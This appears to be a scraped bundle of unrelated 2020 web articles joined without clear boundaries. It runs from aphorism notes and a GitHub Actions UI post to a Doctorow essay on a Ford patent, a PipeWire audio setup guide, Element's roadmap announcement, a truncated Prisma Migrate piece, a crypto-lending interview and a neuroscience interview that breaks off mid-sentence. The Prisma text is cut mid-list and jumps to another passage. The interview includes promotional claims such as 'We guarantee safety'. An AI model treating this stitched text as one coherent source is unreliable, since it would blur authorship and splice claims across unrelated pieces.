signaled pride rather than shame for lack of talent, finesse, and, mostly, sprezzatura</li><li>Life is about early detection of the reversal point beyond which your own belongings (say, a house, country house, car, or business) start owning you</li><li>In any subject, if you don’t feel that you don’t know enough, you don’t know enough</li><li>Regular minds find similarities in stories (and situations); finer minds detect differences</li><li>The more complex the system, the weaker the notion of Universal</li><li>Just as dyed hair makes older men less attractive, it is what you do to hide your weaknesses that makes them repugnant</li><li>Robustness is progress without impatience</li><li>Failure-resistant is achievable; failure-free is not</li><li>For a free person, the optimal – most opportunistic – route between two points should never be the shortest one</li><li>Knowledge is subtractive, not additive – what we subtract (reduction by what does not work, what <em>not</em> to do), not what we add (what to do). The best way to spot a charlatan: someone (like a consultant or stockbroker) who tells you what to do instead of what not to do)</li><li>They think that intelligence is about noticing things that are relevant (detecting patterns); in a complex world, intelligence consists in ignoring things that are irrelevant (avoiding false patterns).</li><li>They would take forecasting more seriously if it were pointed out to them that in Semitic languages the word for “forecast” and “prophecy” are the same</li><li>Economics is about making simple things more complicated, mathematics about making complicated things simpler</li><li>It is easier to macrobullshit than microbullshit</li><li>It is a sign of weakness to avoid showing signs of weakness</li><li>The only definition of an alpha male: if you try to be an alpha male, you will never be one</li><li>The weak shows his strength and hides his weaknesses; the magnificent exhibits his weaknesses like ornaments</li><li>Contra the prevailing belief, “success” isn’t being on top of a hierarchy, it is standing outside all hierarchies</li><li>It is very easy to be stoic, in failure</li><li>A verbal threat is the most authentic certificate of impotence&nbsp;</li><li>Wisdom that is hard to execute isn’t really wisdom</li><li>If something looks irrational – and has been so for a long time – odds are you have a wrong definition of rationality</li><li>Knowing stuff others don’t know is most effective when others don’t know you know stuff they don’t know</li><li>Humans need to complain just as they need to breathe. Never stop them; just manipulate them by controlling what they complain about and supply them with reasons to complain. They will complain but be thankful&nbsp;</li><li>Injuries done to us by others tend to be acute; the self-inflicted ones tend to be chronic</li><li>We often benefit from harm done to us by others, almost never from self-inflicted injuries&nbsp;</li><li>By setting oneself totally free of constraints, free of thoughts, free of this debilitating activity called work, free of efforts, elements hidden in the texture of reality start staring at you; then mysteries that you never thought existed emerge in front of your eyes.&nbsp;</li></ol>



<p>What I got out of it</p>



<ol><li>A lot of wisdom to meditate on and absorb – best read a couple lines per day to let these ideas sink in.</li></ol>

<p>Last night Github appears to have released a big update to the Github Actions workflow user interface. </p>



<p>While there has not been a post on the <a href="https://github.blog/changelog/">Github changelog</a> about this yet, the Github roadmap does list <a href="https://github.com/github/roadmap/issues/88">#88 Actions: Workflow visualization</a> as feature that was slotted for Github Enterprise customers but became a release for all users as of mid-October.</p>



<p>Here’s a comparison of a workflow detail view as of yesterday versus today on the same Github Actions workflow. (Note, I also run <code><a href="https://github.com/sindresorhus/refined-github">refined-github</a></code> so you may notice unrelated style improvements in some elements):</p>



<figure><img loading="lazy" width="979" height="1024" src="https://banagale.com/wp-content/uploads/2020/12/github-actions-workflow-UI-old-1-979x1024.png" alt="" srcset="https://banagale.com/wp-content/uploads/2020/12/github-actions-workflow-UI-old-1-979x1024.png 979w, https://banagale.com/wp-content/uploads/2020/12/github-actions-workflow-UI-old-1-287x300.png 287w, https://banagale.com/wp-content/uploads/2020/12/github-actions-workflow-UI-old-1-768x803.png 768w, https://banagale.com/wp-content/uploads/2020/12/github-actions-workflow-UI-old-1-1469x1536.png 1469w, https://banagale.com/wp-content/uploads/2020/12/github-actions-workflow-UI-old-1-1958x2048.png 1958w, https://banagale.com/wp-content/uploads/2020/12/github-actions-workflow-UI-old-1-1200x1255.png 1200w, https://banagale.com/wp-content/uploads/2020/12/github-actions-workflow-UI-old-1-1980x2071.png 1980w" sizes="(max-width: 979px) 100vw, 979px"><figcaption>Previous Github Workflow UI</figcaption></figure>



<figure><img loading="lazy" width="979" height="1024" src="https://banagale.com/wp-content/uploads/2020/12/github-actions-workflow-UI-new-1-979x1024.png" alt="" srcset="https://banagale.com/wp-content/uploads/2020/12/github-actions-workflow-UI-new-1-979x1024.png 979w, https://banagale.com/wp-content/uploads/2020/12/github-actions-workflow-UI-new-1-287x300.png 287w, https://banagale.com/wp-content/uploads/2020/12/github-actions-workflow-UI-new-1-768x803.png 768w, https://banagale.com/wp-content/uploads/2020/12/github-actions-workflow-UI-new-1-1469x1536.png 1469w, https://banagale.com/wp-content/uploads/2020/12/github-actions-workflow-UI-new-1-1958x2048.png 1958w, https://banagale.com/wp-content/uploads/2020/12/github-actions-workflow-UI-new-1-1200x1255.png 1200w, https://banagale.com/wp-content/uploads/2020/12/github-actions-workflow-UI-new-1-1980x2071.png 1980w" sizes="(max-width: 979px) 100vw, 979px"><figcaption>Update to Github Workflow UI</figcaption></figure>



<p>My primary concern with this view was not only related to the visual presentation of workflow, which I had already tried to mend using <a href="https://github.com/ankit/stylebot"><code>stylebot</code></a>) but that the data output from individual jobs in workflows was disappearing and required unexpected refresh.</p>



<p>There is also a new brand new Workflow Summary tab:</p>



<figure><img loading="lazy" width="804" height="1024" src="https://banagale.com/wp-content/uploads/2020/12/github-actions-workflow-summary-tab-UI-new-804x1024.png" alt="" srcset="https://banagale.com/wp-content/uploads/2020/12/github-actions-workflow-summary-tab-UI-new-804x1024.png 804w, https://banagale.com/wp-content/uploads/2020/12/github-actions-workflow-summary-tab-UI-new-236x300.png 236w, https://banagale.com/wp-content/uploads/2020/12/github-actions-workflow-summary-tab-UI-new-768x978.png 768w, https://banagale.com/wp-content/uploads/2020/12/github-actions-workflow-summary-tab-UI-new-1206x1536.png 1206w, https://banagale.com/wp-content/uploads/2020/12/github-actions-workflow-summary-tab-UI-new-1608x2048.png 1608w, https://banagale.com/wp-content/uploads/2020/12/github-actions-workflow-summary-tab-UI-new-1200x1528.png 1200w, https://banagale.com/wp-content/uploads/2020/12/github-actions-workflow-summary-tab-UI-new-1980x2522.png 1980w" sizes="(max-width: 804px) 100vw, 804px"><figcaption>New Github Actions Workflow Summary Tab</figcaption></figure>



<p>In this project, I’m working entirely with Self-Hosted Runners that have a fairly detailed CI/CD requirement. </p>



<p>My other projects use Github runners, and I think Github Actions is a major improvement in delivering CI/CD to projects and takes advantage of the resources provided by the Microsoft acquisition via Azure.</p>



<p>If I have time, I’ll offer a more detailed analysis of the change. For now,  you can see my previous writing on <a href="https://banagale.com/running-django-tests-in-github-actions.htm">Running Django Tests in Github Actions</a>.</p>

<p>In my 2017 novel WALKAWAY, there's a scene where the protagonists get into a self-driving car owned by a ruthless plutocrat, only to discover that it moves faster than any other vehicle they've ever ridden.</p>
<p><a href="https://craphound.com/category/walkaway/">https://craphound.com/category/walkaway/</a></p>
<p>The plute explains that he's done an illegal mod that lets him override the lane-change safety margins and pay fines for it – an illustration of the principle that "a fine is a price."</p>
<p>It was meant as broad satire, not a suggestion.</p>
<p>Specifically, it was meant to satirize the idea that if you create "markets in everything" you'll get efficient allocations – some people <em>really</em> want to change lanes and others only <em>sorta</em> want to change lanes but the lane-change slots aren't allocated according to priority.</p>
<p>There are so many flaws in this idea, but the biggest one is that some people are <em>very</em> rich and most people are <em>very</em> broke and so a willingness on the part of a rich person to pay $X may indicate a mild preference, but a poor person might be indicating a strong preference.</p>
<p>If $X is 100% of a poor person's disposable income and 0.000001% of a rich person's disposable income, the rich person's whims trump the poor person's needs. This is going on around us, all the time.</p>
<p>The richest parts of London have the lowest covid rates but also the most rapid testing:</p>
<p><a href="https://bylinetimes.com/2020/12/04/wealthy-london-areas-low-covid-case-rates-included-in-rapid-testing-programme/">https://bylinetimes.com/2020/12/04/wealthy-london-areas-low-covid-case-rates-included-in-rapid-testing-programme/</a></p>
<p>Remember when Homer charged a $1000 baldness cure that revolutionized his life to the company insurance and cost Mr Burns his ivory-handled back-scratcher?</p>
<p>Burns: I was going to buy that ivory back scratcher. How did he do it?</p>
<p>Smithers: He charged the company for Dimoxinil.</p>
<p>Back to Walkaway. Cyberpunk has a funny relationship with capitalism's most ardent trufans: inevitably, the parts that are meant as warnings are read as suggestions.</p>
<p>Which brings me to Ford's Patent 20200380860: "Smart Contract Formation, Handling and Fulfilment Between Vehicles."</p>
<p><a href="https://trea.com/information/smart-contract-formation-handling-and-fulfilment-between-vehicles/patentapplication/ed72fddf-403e-4e5d-aeea-03cb2701296c">https://trea.com/information/smart-contract-formation-handling-and-fulfilment-between-vehicles/patentapplication/ed72fddf-403e-4e5d-aeea-03cb2701296c</a></p>
<p>It's written in the garbage legalese of all patent applications, but Patent Drop provides a handy translation: "imagine a car wants to merge… other vehicles would need to slow down, and in turn an inconvenience is created for them. Ford is proposing a system where the vehicles that need to slow down receive a payment for slowing down, while the vehicle that wants to do the slowing down, incurs a payment."</p>
<p><a href="https://www.newzstack.com/newsletters/015-patent-drop">https://www.newzstack.com/newsletters/015-patent-drop</a></p>
<p>But there's more! Are you using a private vehicle on a route served by public transit? You stand to be compensated!</p>
<p>"If a light changes prematurely to accommodate a bus, this could entitle all vehicles with a certain distance of the light to a certain payment."</p>
<p>I would say "You can't make this shit up," except that I make this shit up for a living, but – and I can't repeat this often enough – as a warning, not a suggestion.</p>

<p>I just realized that, once again, I’ve spent half of a year without publishing. Oh no! To me, the frequency of blogging is an indicator of the work/life balance – if I have time to blog, that’s good and healthy. The past months have indeed been intense, and in addition to that, I’ve been burning my writing energy with the Mutter &amp; Shell blog ¹.</p>



<p>Anyway.</p>



<p>A couple of months ago, I wanted to have another look at PipeWire, and how it was progressing. My primary contact with PipeWire comes from screensharing code, such as Mutter and <a href="https://gitlab.gnome.org/feaneron/obs-xdg-portal/">obs-xdg-portal</a>. At this point, nothing except a couple of isolated tests with PipeWire’s JACK replacement libraries were made. Nothing serious. Nonetheless, I’ve been cheering from the sideways that the day I could routinely use JACK through PipeWire would come.</p>



<h2>JACK</h2>





<p>Over the past 10 years or so, I have tried to eventually setup JACK, without success. In the past, JACK was just too hard to get right; I also tried the glue code between JACK and PulseAudio, but it was finicky, and I also failed to set it up properly.</p>



<p>In addition to that, JACK is also a challenge to sandbox technologies, such as Flatpak. Because the JACK server and client libraries need to have matching ABIs, it would require very big holes in the sandbox to work.</p>



<p>Thanks to PipeWire, replacing JACK was a breeze. PipeWire provides drop-in replacement libraries for JACK, and a small <code>pw-jack</code> utility to run JACK applications using PipeWire. It’s as simple as:</p>



<pre><code><code>$ pw-jack &lt;application&gt;</code></code></pre>



<p>If, like me, you don’t plan on installing real JACK, it is possible to easily tell ldconf to look for PipeWire’s JACK libraries first. Create a new file <code>/etc/ld.so.conf.d/pipewire-jack.conf</code>:</p>



<pre><code>/usr/lib/pipewire-0.3/jack</code></pre>



<p>Make sure to check which library path your distro uses! It seems Fedora uses <code>/usr/lib64</code>, so the path above would need to be adjusted accordingly.</p>



<p>Then update with:</p>



<pre><code>$ sudo ldconfig</code></pre>



<p>That’s it! Now you can run JACK applications on your system without any additional step; simply launch them, and it should work.</p>

<h2>PulseAudio</h2>



<p>Like JACK, PipeWire has replacement libraries for PulseAudio. However, since the 0.3.14 release, PipeWire comes with a PulseAudio <em>server</em> instead. This server exposes a PulseAudio socket, and pretends to be a complete PulseAudio server, only that internally it translates commands to PipeWire commands.</p>



<p>As of today, December 7th 2020, I’m happily running my entire desktop using PipeWire. After installing pipewire-pulse, and removing the pulseaudio daemon, I enabled it with:</p>



<pre><code>$ systemctl --user enable pipewire.service pipewire-pulse.service</code></pre>



<p>Hopefully package managers will automatically do this in the future. Keep in mind that even if PulseAudio’s and PipeWire’s daemons don’t break spectacularly when running together, it is recommended to only run one at a time.</p>



<h2>Mixing All Together</h2>



<p>Perhaps one of the most fantastic collateral effects of all applications using PipeWire is that JACK, PulseAudio, and PipeWire applications can interact with each other on some circumstances. For example:</p>



<div><figure><a href="https://feaneron.files.wordpress.com/2020/12/5hzrqy0.jpg"><img data-attachment-id="5970" data-permalink="https://feaneron.com/5hzrqy0/" data-orig-file="https://feaneron.files.wordpress.com/2020/12/5hzrqy0.jpg" data-orig-size="3840,2160" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="5hzrqy0" data-image-description="" data-medium-file="https://feaneron.files.wordpress.com/2020/12/5hzrqy0.jpg?w=300" data-large-file="https://feaneron.files.wordpress.com/2020/12/5hzrqy0.jpg?w=1024" src="https://feaneron.files.wordpress.com/2020/12/5hzrqy0.jpg?w=1024" alt="" srcset="https://feaneron.files.wordpress.com/2020/12/5hzrqy0.jpg?w=1024 1024w, https://feaneron.files.wordpress.com/2020/12/5hzrqy0.jpg?w=2048 2048w, https://feaneron.files.wordpress.com/2020/12/5hzrqy0.jpg?w=150 150w, https://feaneron.files.wordpress.com/2020/12/5hzrqy0.jpg?w=300 300w, https://feaneron.files.wordpress.com/2020/12/5hzrqy0.jpg?w=768 768w" sizes="(max-width: 1024px) 100vw, 1024px"></a><figcaption>Using Carla (JACK) to route Spotify (Flatpak; PulseAudio) audio to OBS Studio’s JACK plugin (Flatpak; JACK)</figcaption></figure></div>



<p>Despite being in such an early state – this isn’t even 3 months old code! – PipeWire is capable of being my everyday sound server, and my personal setup is not a trivial one. I routinely use an USB DAC with a condenser and a dynamic microphone, with a mix of Flatpak applications using PulseAudio (Chromium, Firefox, and rarely Zoom), Flatpak applications using JACK (Ardour, OBS Studio), and host applications using both, and it’s dealing with this almost perfectly. I find it really inspiring to see good projects like this growing and getting better!</p>



<p>Thanks to Wim Taymans and all PipeWire contributors for making this possible. I’m looking forward the future where PipeWire is the standard media server for the Linux desktop!</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p>It’s been a busy year for Element. At a glance, so far this year we’ve:</p><ul><li>Improved security for private communication, <a href="https://element.io/blog/e2e-encryption-by-default-cross-signing-is-here/">enabling end-to-end encryption by default</a></li><li>Changed our identity, <a href="https://element.io/blog/welcome-to-element/">rebranding from Riot, New Vector and Modular to Element</a></li><li><a href="https://element.io/blog/bonjour-element-on-android/">Launched a brand new Android app</a> (previously known as RiotX)</li><li>Upgraded the extensibility of rooms with <a href="https://element.io/blog/element-1-7-8-is-out/">improved widgets</a></li><li><a href="https://element.io/blog/gitter-is-joining-element/">Welcomed Gitter to Element</a></li><li>And released hundreds of other features and improvements across Mobile &amp; Desktop</li></ul><p>As an open source project, we’ve always strived to default to transparency, working on features in the open with our vibrant open source community. Historically, most of this discussion has happened in our public repositories, like <a href="https://github.com/vector-im/element-web/issues">Element Web</a>, or in <a href="https://matrix.to/#/#element-web:matrix.org">rooms on Matrix</a>. </p><p>However, most of this discussion is quite granular. It doesn't give visibility on the overall direction and is impenetrable for everyone removed from day-to-day engineering efforts. Today we’re rectifying that by publishing a public roadmap.</p><h2 id="the-roadmap">The roadmap</h2><p>We’re publishing the <a href="https://github.com/vector-im/roadmap/projects/1">Element public roadmap</a> in a new public repository and project board that anyone can access. The board is arranged across a few columns to give low touch, high visibility information on what we have planned and when.</p><figure><img src="https://element.io/blog/content/images/2020/12/Element-Public-Roadmap.png" alt="" srcset="https://element.io/blog/content/images/size/w600/2020/12/Element-Public-Roadmap.png 600w, https://element.io/blog/content/images/size/w1000/2020/12/Element-Public-Roadmap.png 1000w, https://element.io/blog/content/images/size/w1600/2020/12/Element-Public-Roadmap.png 1600w, https://element.io/blog/content/images/size/w2400/2020/12/Element-Public-Roadmap.png 2400w" sizes="(min-width: 1200px) 1200px"></figure><p><br>The ‘Now’ column represents features or areas in flight, with subsequent columns arranged by highest confidence and likelihood. Within each column, cards are in ascending priority order. Over time as we do user research, get feedback and conduct technical R&amp;D we'll promote cards further to the left and closer to 'Now'.</p><div><p>The roadmap will be updated regularly, and will evolve over time as we iterate on it based on feedback and usage in practise. It describes larger, multi-week cross-functional development we’re committed to.</p><p>If you have issues or feature requests you’d like to submit, the best place for those is still individual repos (linked to from the roadmap) or in <a href="https://matrix.to/#/#element-web:matrix.org">a discussion on Matrix</a>.</p></div><h2 id="what-s-next">What's next</h2><p>Publishing the public roadmap is a major step forward in maintaining and sharing a consistent view across all of what we’re working on. So, what’s next?</p><h3 id="defaulting-to-transparency">Defaulting to transparency</h3><p>The eagle eyed amongst you might notice some items on the roadmap are private. While we’d love to publicly reference all feature development— it’s understandable why some users like the <a href="https://element.io/blog/bwmessenger-goes-live-for-bundeswehr/">German Armed Forces</a> require elevated security when planning, sponsoring and executing on development. As we iterate on the roadmap, we’ll also be figuring out how we can better default to transparency when users have exacting demands on security.</p><h3 id="maturing-items-scope-direction">Maturing items, scope &amp; direction</h3><p>Some roadmap items are deliberately ambiguous, which we’ll mature as we conduct more research and development. Additional items will be added from more corners of development— like platform engineering efforts to improve developer experience, and projects from domain experts like cryptographers.<br></p><p><strong>Lastly, we’re working hard on Element and need your help! </strong>If any of the features on the roadmap are exciting to you (or someone you know) and you’re interested in joining the team— <a href="https://element.io/careers">we’d love to hear from you</a> as we’re hiring across engineering, design and product.</p><p>(On a similar note, if you see an item on the roadmap you’d like to sponsor to make a reality in Element sooner then please <a href="https://element.io/contact-us">get in touch</a>.)</p><p>As always, if you have any questions or comments, let us know! We’re looking forward to hearing them.</p><p>P.S. If you missed it, we also gave a video tour of the roadmap in last weeks Matrix Live:</p><figure><iframe width="612" height="344" src="https://www.youtube.com/embed/qnHAAkY2Cx0?feature=oembed" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe></figure></div></div>]]>

Migrate is based on the <a href="https://www.prisma.io/docs/concepts/components/prisma-schema#example">Prisma schema</a> – a declarative data model definition that codifies your database schema.</p><p>This Preview release is the evolution of the Experimental version of Migrate that we released last year. Since then, we've been gathering feedback from the community and incorporating it into Prisma Migrate.</p><h3 id="making-schema-migrations-predictable"><a href="#making-schema-migrations-predictable" aria-label="making schema migrations predictable permalink"></a>Making schema migrations predictable</h3><p>Database schema migrations play a crucial role in software development workflows and affect the most critical component in your application – the database. We've built Migrate to be predictable while allowing you to control how database schema changes are carried out.</p><p>Prisma Migrate generates migrations as plain SQL files based on changes in your Prisma schema. These SQL files are fully customizable and allow you to use any feature of the underlying database, such as manipulating data supporting a migration, setting up triggers, stored procedures, and views.</p><p>Prisma Migrate treads the balance between productivity and control by automating the repetitive and error-prone aspects of writing database migrations while giving you the final say over how they are executed.</p><h3 id="integration-with-prisma-client"><a href="#integration-with-prisma-client" aria-label="integration with prisma client permalink"></a>Integration with Prisma Client</h3><p>Prisma Migrate integrates with Prisma Client using the Prisma schema as their shared source of truth. In other words, both Prisma Client and migrations are generated based on the Prisma schema. This makes synchronizing and verifying database schema changes in your application code easier by leveraging Prisma Client's type safety.</p><h3 id="prisma-migrate-is-ready-for-broader-testing"><a href="#prisma-migrate-is-ready-for-broader-testing" aria-label="prisma migrate is ready for broader testing permalink"></a>Prisma Migrate is ready for broader testing</h3><p>Prisma Migrate has passed rigorous testing internally and is now ready for broader testing by the community. You can use it with PostgreSQL, MySQL, SQLite, and SQL Server. <strong>However, as a Preview feature, it is not fully production-ready yet.</strong> To read more about what Preview means, check out the <a href="https://www.prisma.io/docs/more/releases#preview">maturity levels</a> in the Prisma docs.</p><p>Thus, we're inviting you to try it out and <a target="_blank" rel="noopener noreferrer" href="https://github.com/prisma/prisma/issues/4531">give us feedback</a> so we can bring Prisma Migrate to General Availability. 🚢</p><p>Your feedback and suggestions will help us shape the future of Prisma Migrate. 🙌</p><hr><h2 id="how-does-prisma-migrate-work"><a href="#how-does-prisma-migrate-work" aria-label="how does prisma migrate work permalink"></a>How does Prisma Migrate work?</h2><p>Prisma Migrate is based on the <a href="https://www.prisma.io/docs/reference/tools-and-interfaces/prisma-schema">Prisma schema</a> and works by generating <code>.sql</code> migration files that are executed against your database.</p><p>The Prisma schema is the starting point for schema migrations and provides an overview of your desired end-state of the database. Prisma Migrate inspects changes in the Prisma schema and generates the necessary <code>.sql</code> migration files to apply.</p><p>Applying migrations looks very different depending on the stage of development. For example, during development, there are scenarios where resetting the database can be tolerated for quicker prototyping, while in production, great care must be taken to avoid data loss and breaking changes.</p><p>Prisma Migrate accommodates for this with workflows for local development and applying migrations in production.</p><h3 id="evolving-the-schema-in-development"><a href="#evolving-the-schema-in-development" aria-label="evolving the schema in development permalink"></a>Evolving the schema in development</h3><p>To use the new version of Prisma Migrate, you should have at least version <code>2.13.0</code> of the <a href="https://www.prisma.io/docs/concepts/components/prisma-cli/installation"><code>@prisma/cli</code></a> package installed.</p><p>During development, you first define the Prisma schema and then run the <code>prisma migrate dev --preview-feature</code> command, which generates the migration, applies it, and generates Prisma Client:</p><p><span><img src="https://d33wubrfki0l68.cloudfront.net/9dee8cc50b930a017447904d95e15e0e82f9a3bf/426d4/blog/posts/2020-12-migrate-development-workflow.png" alt="Development workflow"><span>Development workflow</span></span></p><p>Here is an example showing it in action:</p><p><strong>1.

In other words, the exact steps of the migration are determined when the migration is created, allowing you to inspect the SQL (and make changes if necessary) before running.</p><p>This approach has the following benefits:</p><ul><li>The generated SQL is editable, thereby allowing you to control the exact schema changes.</li><li>The migration is predictable with the exact SQL that will be applied.</li><li>You don't need to write SQL unless you want to change a migration.</li><li>You can perform data migrations using SQL as part of a migration.</li></ul><p>Editable SQL for migrations is useful in scenarios where there are multiple ways to map changes in the Prisma schema to the database, and the desired path cannot be automatically determined.</p><p>For example, when you rename a field in the Prisma schema, that can be interpreted as either deleting the column and adding an unrelated new one or as you renaming the column. By allowing you to inspect and edit the migration SQL, you can decide whether to rename the column (and retain the data in the column) or drop it and add a new one.</p><p>If you're upgrading Prisma Migrate from the Experimental version, check out the <a href="https://www.prisma.io/docs/guides/prisma-guides/prisma-migrate-guides/add-prisma-migrate-to-a-project">upgrade guide</a>.</p><hr><h2 id="whats-next"><a href="#whats-next" aria-label="whats next permalink"></a>What's next</h2><p>This Preview version of Prisma Migrate lays the foundations for the upcoming General Availability release.

December 8, 2020 | https://cvbj.biz/bitcoin-and-crypto-from-central-banks-will-coexist-in-a-cashless-future/ | <a href="https://web.archive.org/web/*/https://cvbj.biz/bitcoin-and-crypto-from-central-banks-will-coexist-in-a-cashless-future/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="">
<p>Despite having consolidated as an investment asset in 2020, in the heat of the pandemic, the <strong>use of bitcoin and ‘altcoins’ as a payment method</strong> It is one of the great subjects of cryptocurrencies that they have not been able to solve by themselves.  It is becoming increasingly clear that crypto currencies that inhabit a market of more than 550,000 million dollars will not replace fiat money, but will have to coexist with future digital currencies of central banks, while initiatives that serve as a bridge between investment and the real economy, as is the case of <strong>Nebeus</strong>.</p>
<p>The Barcelona and London-based fintech belongs to a new generation of companies developing financial products based on cryptography.  Their services range from buying and selling of ‘cryptos’,<strong> instant loans in euros or dollars</strong> taking bitcoin or other digital currencies as collateral for transfers and deposits.  It has just launched a crowdfunding to accelerate its growth and implement new products and services in the market, such as the Nebeus MasterCard, whose introduction is planned for the first quarter of 2021. We spoke with <strong>Michael stroev</strong>, COO of the company.</p>
<p><strong>Was Nebeus born with the will to save the deficiencies of bitcoin as it is not a payment method?</strong></p>
<p>It is critical to understand that Satoshi Nakamoto’s creation is not real currency and is not a viable means of making payments.  It is a raw material, a commodity, and as many call it, <strong>it’s digital gold</strong>.  Investors place capital in bitcoin to obtain short or long-term gains on fluctuations in its price.  Nebeus seeks to allow people to use their crypto investments to access cash and financial services.  Our platform essentially provides the possibility to use crypto to those who own digital currencies as an investment and helps newcomers to this market to make sense of the possession of cryptocurrencies.</p>
<p><strong>But it is not a paradox that the mere existence of a service like yours confirms what the detractors of bitcoin have long been promoting: that it has no value as a currency …</strong></p>
<p>We agree on this point and <strong>we do not believe it will become a real currency</strong>.  But bitcoin will always be a very powerful and valuable commodity.  The current value of a market of more than 500,000 million dollars and 60 million users proves it.  Nebeus’ goal is to provide the public with everyday services using this product.  We do not aim to promote cryptocurrencies as direct payment methods.  Our mission is to allow users to use cryptography to access financial services that give access to payments.</p>
<p><strong>How exactly does Nebeus work?  Can anyone access a loan in fiat money?</strong></p>
<p>Nebeus’ main product is loans backed by encryption technology.  Our clients transfer their cryptocurrency funds to our platform and can obtain an instant cash loan at the push of a button, using their ‘crypto’ as collateral. <strong>We guarantee safety</strong> through a ‘cold storage’ system, while our clients can use their loans for their daily expenses, all without selling their investments.  Those who want to take their first steps in this market, can add money to their account and buy bitcoins or ethereum directly on our platform using the Nebeus exchange services.</p>
<p>Our platform also offers a multitude of<strong> accompanying financial services</strong>.  Nebeus is integrated into the VISA and Mastercard network and allows money transfers to more than 150 countries.  You can also recharge your mobile phone on more than 500 telecommunications networks and even send cash transfers and receive deposits at more than 230,000 points of sale around the world.</p>
<p>Our target market is the UK and Europe, but we can work with clients almost anywhere in the world as long as they pass our personal verification system.  We do not work in the United States.</p>
<p>Nebeus also offers a unique product in the world ‘crypto’ called <strong>Crypto Renting</strong>.  Nebeus customers can choose to rent their currency to us and we will pay them the monthly or daily rent in euros.  The concept fuses traditional rental, such as apartment rental, with cryptocurrencies.  Traders can hold their crypto as an investment and earn cash benefits from renting their crypto to Nebeus.</p>
<blockquote><p>Bitcoin and other cryptocurrencies will continue to exist in the same way they do today: as highly valuable commodities.  CBDCs are different.</p></blockquote>
<p><strong>Is it the market trend to keep crypto funds as deposits and look for services that allow obtaining liquidity through them?</strong></p>
<p>Systems like ours are becoming mainstream and seeing stellar growth.  The active guarantee of cryptocurrencies on the platforms has grown by 98%, to 5,000 million dollars, between the first and the second quarter of 2020. At the end of the second quarter, more than 10 billion dollars in cryptocurrencies were already kept as collateral.  We hope that this growth will continue and that more users will discover the possibilities that Nebeus and other crypto lending platforms offer.</p>
<p><strong>Do you foresee a future where cryptocurrencies will replace fiat money and companies like yours will become the new banks?</strong></p>
<p>China has already started testing its central bank’s digital currency and all countries are talking about launching their own digital currencies.  We anticipate that in the near future these<strong> CBDC (Central Bank Digital Currencies) will replace fiat money.</strong></p>
<p>As for Nebeus, we have a fully developed infrastructure that already allows us to integrate CBDCs into our platform.  We plan to be at the forefront as soon as these sovereign digital currencies are officially introduced.</p>
<p><strong>Do you think that the coexistence of CBDC and bitcoin is possible?</strong></p>
<p><strong>Bitcoin and other cryptocurrencies will continue to exist</strong> in the same way as today: as very valuable commodities.  CBDCs are different.  As already mentioned, bitcoin is a commodity equivalent to digital gold, while central bank digital currencies are future payment methods.  Both will coexist as they are part of different segments of the financial industry.</p>
<p><strong>Will cash be the one to go extinct in this evolution of payment methods?</strong></p>
<p>We believe that <strong>a society without money is inevitable</strong> and we predict this will happen sooner rather than later.</p>
<p><strong>Has Covid-19 accelerated the disappearance of paper money?</strong></p>
<p>The pandemic has spurred the adoption of cashless payment methods due to the fact that <strong>paper money has been deemed unsanitary</strong> in the context of virus transmission.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>The links between nerve cells, called synapses, allow us to learn and adapt, and hold clues to conditions such as autism, schizophrenia and more</p><div><p>If you were to take a human brain and toss it in a blender — not that you should — the resulting slurry of cells wouldn’t be special in the way that the human brain is. No thoughts, no worries, no wonder or awe.</p><p>That’s because it’s the connections between those cells that make the brain so amazing. By sending electrical signals from nerve cell to nerve cell within a great network of connections, the brain creates thoughts as mundane as “Where are my keys?” or as profound as “I think, therefore I am.”</p><p>Kimberley McAllister has been fascinated by the human brain since college. As a graduate student in the 1990s studying developmental neurobiology, she was drawn to the question of how the brain is built: how individual brain cells in a growing fetus somehow organize themselves into an organ capable one day of pondering the mysteries of life.</p><p>Now director of the Center for Neuroscience at the University of California, Davis, McAllister continues to investigate how the brain’s nerve cells — called neurons — find each other, connect and disengage. She spoke with <em>Knowable</em> <em>Magazine </em>about key discoveries in the study of brain networks, and new work revealing their importance in disease.</p><p>This conversation has been edited for length and clarity.</p><p><strong>The links between neurons are called synapses. What exactly is a synapse, and what happens there?</strong></p><p>It’s basically a connection: one cell talking to another. A brain cell, or a neuron, has a large main body, with small strands sticking out. So one neuron, the transmitter, uses a really thin strand called an axon. A second neuron, the receiver, can receive contacts along its main body, or along strands that branch out like a tree, called dendrites. When the axon tip of a transmitter connects to a receiver, that’s a synapse.</p><p>Neurons run on electricity. If an electrical signal passes down an axon, its tip releases chemicals called neurotransmitters into the synapse. These neurotransmitters tell the receiver cell to either activate its own electrical charge, which sends the signal to the next neuron in the chain, or tell the receiver cell to stay quiet.</p><p>But it’s not as simple as one receiver for every transmitter. For example, in the frontal cortex — the part of the brain housing abilities such as language that distinguish us from other animals — the neurons look beautiful, like trees. They can have 10,000 or more synapses on their branching dendrites, each of which may receive information from a different cell.</p><p>The activity at those thousands of inputs gets added up to cause the neuron to fire — or not — and that’s how information is transferred in the brain. This kind of information transfer, across complicated networks made by the 120 billion neurons in the human brain, allows for complex thoughts.</p><p>Axons and dendrites can move around, especially when the brain is young. The way in which they connect individual neurons creates the network pathways. During development, the 100 trillion synapses in the human cortex form at a rate of an estimated 10,000 every 15 minutes! Together, all these synapses create a giant network. And that gives us consciousness.</p><p><strong>You’ve been studying synapses for more than two decades. How has our understanding evolved?</strong></p><p>When I started, we didn’t know anything about how synapses form. I developed a technique to study dendrite growth. What we realized is that the shape of neurons and dendrites is dependent on <a href="https://www.sciencedirect.com/science/article/pii/S0896627300802391" target="_blank">activity at synapses</a>. That is, if the brain isn’t getting input — from the senses and the environment — and responding with conversations across the network, then the neurons won’t build the right receivers, and the brain won’t develop properly.</p><p>Synapses are very small but incredibly complex molecular machines made up of proteins that guide, maintain and strengthen the 